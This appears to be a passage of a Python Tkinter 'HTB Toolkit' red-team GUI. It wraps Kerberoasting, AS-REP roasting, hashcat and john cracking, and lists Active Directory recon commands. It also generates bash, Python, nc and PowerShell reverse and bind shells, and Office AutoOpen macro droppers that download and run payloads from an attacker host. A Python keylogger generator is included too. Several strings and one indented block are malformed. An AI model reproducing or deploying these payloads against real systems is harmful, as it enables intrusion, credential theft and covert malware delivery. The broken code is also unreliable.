        ip = self.roast_ip.get()
        domain = self.roast_domain.get()
        user = self.roast_user.get()
        passwd = self.roast_pass.get()
        cmd = f"GetNPUsers.py {domain}/{user}:{passwd} -dc-ip {ip} -no-pass"
        self.roast_output.insert(tk.END, f"[ASREPRoast]
{cmd}
")
        result = run_command(cmd)
        self.roast_output.insert(tk.END, result + "\n")

    def run_kerberoast(self):
        ip = self.roast_ip.get()
        domain = self.roast_domain.get()
        user = self.roast_user.get()
        passwd = self.roast_pass.get()
        cmd = f"GetUserSPNs.py {domain}/{user}:{passwd} -dc-ip {ip} -request"
        self.roast_output.insert(tk.END, f"[Kerberoast]
{cmd}
")
        result = run_command(cmd)
        self.roast_output.insert(tk.END, result + "\n")

    def init_password_cracker(self):
        self._styled_label(self.redteam_tab, "Password Cracking (hashcat / john)")

        btn_frame = tk.Frame(self.redteam_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=2)

        self._styled_button(btn_frame, "Load Hash File", self.load_hash_file)
        self._styled_button(btn_frame, "Load Wordlist", self.load_wordlist_file)
        self._styled_button(btn_frame, "Crack with hashcat", self.run_hashcat)
        self._styled_button(btn_frame, "Crack with john", self.run_john)

        self.hash_file = ""
        self.wordlist_file = ""

        self.crack_output = self._styled_text(self.redteam_tab, height=10)

    def load_hash_file(self):
        path = filedialog.askopenfilename(title="Select hash file")
        if path:
            self.hash_file = path
            self.crack_output.insert(tk.END, f"[+] Hash file loaded: {path}\n")

    def load_wordlist_file(self):
        path = filedialog.askopenfilename(title="Select wordlist file")
        if path:
            self.wordlist_file = path
            self.crack_output.insert(tk.END, f"[+] Wordlist loaded: {path}\n")

    def run_hashcat(self):
        if not self.hash_file or not self.wordlist_file:
            self.crack_output.insert(tk.END, "[!] Load both hash and wordlist first\n")
            return
        cmd = f"hashcat -m 13100 -a 0 {self.hash_file} {self.wordlist_file} --force"
        self.crack_output.insert(tk.END, f"[hashcat]
{cmd}
")
        result = run_command(cmd)
        self.crack_output.insert(tk.END, result + "\n")

    def run_john(self):
        if not self.hash_file or not self.wordlist_file:
            self.crack_output.insert(tk.END, "[!] Load both hash and wordlist first\n")
            return
        cmd = f"john --wordlist={self.wordlist_file} {self.hash_file}"
        self.crack_output.insert(tk.END, f"[john]
{cmd}
")
        result = run_command(cmd)
        self.crack_output.insert(tk.END, result + "\n")

    def init_domain_recon(self):
        self._styled_label(self.redteam_tab, "Domain Reconnaissance (Active Directory)")

        self._styled_button(self.redteam_tab, "Show Recon Examples", self.show_domain_recon_examples)

        self.domainrecon_output = self._styled_text(self.redteam_tab, height=14)

    def show_domain_recon_examples(self):
        recon = """
[Basic Net Commands]
net view /domain
net group "Domain Admins" /domain
net user /domain

[PowerView (PowerShell)]
Get-NetDomain
Get-NetUser -UserName *
Get-NetGroupMember -GroupName "Domain Admins"
Invoke-ShareFinder

[SharpHound (BloodHound)]
SharpHound.exe -c All
neo4j console && bloodhound

[AD Enumeration Tools]
ldapsearch -x -h <DC_IP>
impacket-ldapdomaindump

[DNS Recon]
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN

[User Hunting]
Invoke-UserHunter
Get-NetLoggedon
"""
        self.domainrecon_output.delete(1.0, tk.END)
        self.domainrecon_output.insert(tk.END, recon)

    def init_custom_shell_generator(self):
        self._styled_label(self.redteam_tab, "Custom Shell Generator")

        self._styled_label(self.redteam_tab, "LHOST")
        self.custom_ip = self._styled_entry(self.redteam_tab, "10.10.14.1")

        self._styled_label(self.redteam_tab, "LPORT")
        self.custom_port = self._styled_entry(self.redteam_tab, "4444")

        self._styled_label(self.redteam_tab, "Shell Type")
        self.shell_type = ttk.Combobox(self.redteam_tab, values=["bash", "sh", "python", "perl", "nc", "powershell"])
        self.shell_type.set("bash")
        self.shell_type.pack(pady=2)

        self._styled_label(self.redteam_tab, "Connection Mode")
        self.conn_mode = ttk.Combobox(self.redteam_tab, values=["reverse", "bind", "ssl", "pipe"])
        self.conn_mode.set("reverse")
        self.conn_mode.pack(pady=2)

        self._styled_button(self.redteam_tab, "Generate Shell", self.generate_custom_shell)

        self.custom_shell_output = self._styled_text(self.redteam_tab, height=10)

    def generate_custom_shell(self):
        ip = self.custom_ip.get()
        port = self.custom_port.get()
        shell = self.shell_type.get()
        mode = self.conn_mode.get()

        payload = ""
        if mode == "reverse":
            if shell == "bash":
                payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            elif shell == "python":
                payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'"
            elif shell == "nc":
                payload = f"nc -e /bin/sh {ip} {port}"
            elif shell == "powershell":
                payload = f"powershell -nop -w hidden -c $client = New-Object Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();..."

        elif mode == "bind":
            if shell == "nc":
                payload = f"nc -nlvp {port} -e /bin/sh"
            elif shell == "bash":
                payload = f"while true; do nc -nlvp {port} -e /bin/bash; done"

        elif mode == "ssl":
            payload = f"openssl s_client -connect {ip}:{port} -quiet"

        elif mode == "pipe":
            payload = f"mkfifo /tmp/s; /bin/sh </tmp/s | nc {ip} {port} >/tmp/s"

        self.custom_shell_output.delete(1.0, tk.END)
        self.custom_shell_output.insert(tk.END, payload + "\n")

    def init_office_macro_dropper(self):
        self._styled_label(self.redteam_tab, "Office Macro Dropper Generator (Word/Excel VBA)")

        self._styled_label(self.redteam_tab, "LHOST")
        self.macro_ip = self._styled_entry(self.redteam_tab, "10.10.14.1")

        self._styled_label(self.redteam_tab, "LPORT")
        self.macro_port = self._styled_entry(self.redteam_tab, "8000")

        self._styled_label(self.redteam_tab, "Payload Type")
        self.macro_type = ttk.Combobox(self.redteam_tab, values=["PowerShell Reverse Shell", "EXE Downloader"])
        self.macro_type.set("PowerShell Reverse Shell")
        self.macro_type.pack(pady=2)

        self._styled_button(self.redteam_tab, "Generate Macro Code", self.generate_macro_code)

        self.macro_output = self._styled_text(self.redteam_tab, height=12)

    def generate_macro_code(self):
        ip = self.macro_ip.get()
        port = self.macro_port.get()
        mtype = self.macro_type.get()
        macro = ""

        if mtype == "PowerShell Reverse Shell":
            payload = f"powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')"
        elif mtype == "EXE Downloader":
            payload = f"certutil -urlcache -split -f http://{ip}:{port}/payload.exe payload.exe && start payload.exe"

        macro = f"""Sub AutoOpen()
    Dim str As String
    str = "cmd.exe /c {payload}"
    CreateObject("Wscript.Shell").Run str, 0, False
End Sub"""

        self.macro_output.delete(1.0, tk.END)
        self.macro_output.insert(tk.END, macro + "\n")

    def init_office_dropper_injector(self):
        self._styled_label(self.redteam_tab, "Drag & Drop Word/Excel File (Inject Macro)")

        dnd_frame = tk.Frame(self.redteam_tab, bg=self.THEME["bg"], relief="groove", bd=2)
        dnd_frame.pack(pady=4, padx=6, fill="x")

        drop_label = tk.Label(dnd_frame, text="Drop .doc/.docx/.xls/.xlsx file here", bg=self.THEME["bg"], fg="cyan")
        drop_label.pack(pady=8)

        # Примерен placeholder – реална поддръжка с tkdnd или tkinterDnD2
        drop_label.bind("<Button-1>", lambda e: self.simulate_office_file_drop())

    def simulate_office_file_drop(self):
        from tkinter import filedialog
        file_path = filedialog.askopenfilename(title="Select Office file", filetypes=[("Office Docs", "*.docx *.doc *.xls *.xlsx")])
        if not file_path:
            return

        # Примерен макрос payload
        macro_payload = 'Sub AutoOpen()
CreateObject("Wscript.Shell").Run "cmd /c calc.exe", 0, False
End Sub'

        # Записваме съдържание в текстовия прозорец
        self.macro_output.delete(1.0, tk.END)
        self.macro_output.insert(tk.END, f"[Injected Macro to: {file_path}]
{macro_payload}

(This is a placeholder for actual macro injection.)")

    def init_linux_macro_injector(self):
        self._styled_button(self.redteam_tab, "Inject VBA (LibreOffice Linux)", self.inject_macro_linux)

    def inject_macro_linux(self):
        from tkinter import filedialog
        import os
        file_path = filedialog.askopenfilename(title="Select .docx File", filetypes=[("Word Files", "*.docx")])
        if not file_path:
            return

        lhost = self.macro_ip.get()
        lport = self.macro_port.get()

        macro_code = (
            "Sub AutoOpen()\n"
            "    CreateObject(\"Wscript.Shell\").Run \"powershell -w hidden -c "
            f"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/shell.ps1')\", 0, False\n"
            "End Sub"
        )

        vba_path = "/tmp/autoopen.vba"
        with open(vba_path, "w") as f:
            f.write(macro_code.replace("\n", "\r\n"))

        output_file = os.path.join(os.path.dirname(file_path), "infected_" + os.path.basename(file_path).replace(".docx", ".docm"))
        cmd = f'libreoffice --headless --convert-to docm --outdir "{os.path.dirname(file_path)}" "{file_path}"'
        os.system(cmd)

        self.macro_output.delete(1.0, tk.END)
        self.macro_output.insert(tk.END, f"[+] Converted to: {output_file}\n")
        self.macro_output.insert(tk.END, f"[!] Injection step is a placeholder. Paste into macro editor manually.\n\n{macro_code}\n")

    def init_keylogger_screencapture(self):
        self._styled_label(self.redteam_tab, "Keylogger & Screencapture Payload Generator")

        self.capture_type = ttk.Combobox(self.redteam_tab, values=["Keylogger (Python)", "Screenshot (Python)"], width=30)
        self.capture_type.set("Keylogger (Python)")
        self.capture_type.pack(pady=2)

        self._styled_button(self.redteam_tab, "Generate Payload", self.generate_capture_payload)
        self.capture_output = self._styled_text(self.redteam_tab, height=12)

    def generate_capture_payload(self):
        option = self.capture_type.get()
        if option == "Keylogger (Python)":
            payload = """import pynput.keyboard

keys = []

    def on_press(key):
    keys.append(str(key))
    if len(keys) >= 10:
        with open("keylog.txt", "a") as log:
            for k in keys:
                log.write(k + "\n")
        keys.clear()

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
"""
        elif option == "Screenshot (Python)":
            payload = """import pyautogui

screenshot = pyautogui.screenshot()
screenshot.save("screenshot.png")
"""

        self.capture_output.delete(1.0, tk.END)
        self.capture_output.insert(tk.END, payload.strip())

    def init_check_tools(self):
        self._styled_button(self.redteam_tab, "Check Installed Tools", self.check_installed_tools)
        self.tools_output = self._styled_text(self.redteam_tab, height=8)

    def check_installed_tools(self):
        import shutil
        tools = [
            "hashcat",
            "john",
            "GetNPUsers.py",
            "GetUserSPNs.py",
            "evil-winrm",
            "libreoffice",
            "unoconv",
            "impacket-ldapdomaindump"
        ]
        results = []
        for tool in tools:
            if shutil.which(tool):
                results.append(f"✅ {tool} found")
            else:
                results.append(f"❌ {tool} NOT found")

        self.tools_output.delete(1.0, tk.END)
        self.tools_output.insert(tk.END, "\n".join(results))

    def configure_style(self):
        style = ttk.Style()
        try:
            style.theme_use("clam")
        except:
            pass
        style.configure(".",
                        background="#1e1e1e",
                        foreground="#d4d4d4",
                        fieldbackground="#2e2e2e",
                        bordercolor="#444",
                        lightcolor="#444",
                        darkcolor="#444")
        style.configure("TButton", padding=6, relief="flat", background="#2e2e2e", foreground="white")
        style.map("TButton",
                  foreground=[("active", "lime")],
                  background=[("active", "#3e3e3e")])

    def init_theme_selector(self):
        self._styled_label(self.dashboard_tab, "Select Theme")

        self.theme_var = tk.StringVar()
        self.theme_selector = ttk.Combobox(self.dashboard_tab, textvariable=self.theme_var,
                                           values=["Dark", "Classic", "BlueHack", "Matrix", "RedOps"])
        self.theme_selector.set("Dark")
        self.theme_selector.pack(pady=4)

        self._styled_button(self.dashboard_tab, "Apply Theme", self.apply_theme)

    def apply_theme(self):
        selected = self.theme_var.get()

        if selected == "Dark":
            bg, fg, textbg, textfg = "#1e1e1e", "#d4d4d4", "#2e2e2e", "white"
        elif selected == "Classic":
            bg, fg, textbg, textfg = "#f0f0f0", "black", "white", "black"
        elif selected == "BlueHack":
            bg, fg, textbg, textfg = "#0b1a33", "#00ccff", "#102542", "#00ffff"
        elif selected == "Matrix":
            bg, fg, textbg, textfg = "black", "lime", "black", "lime"
        elif selected == "RedOps":
            bg, fg, textbg, textfg = "#330000", "#ff4d4d", "#1a0000", "#ff9999"

        style = ttk.Style()
        style.configure(".", background=bg, foreground=fg, fieldbackground=textbg)
        style.configure("TButton", background=textbg, foreground=fg)
        style.map("TButton", foreground=[("active", fg)], background=[("active", bg)])

        self.root.configure(bg=bg)


if __name__ == "__main__":
    root = tk.Tk()
    app = HTBToolkitApp(root)
    root.mainloop()
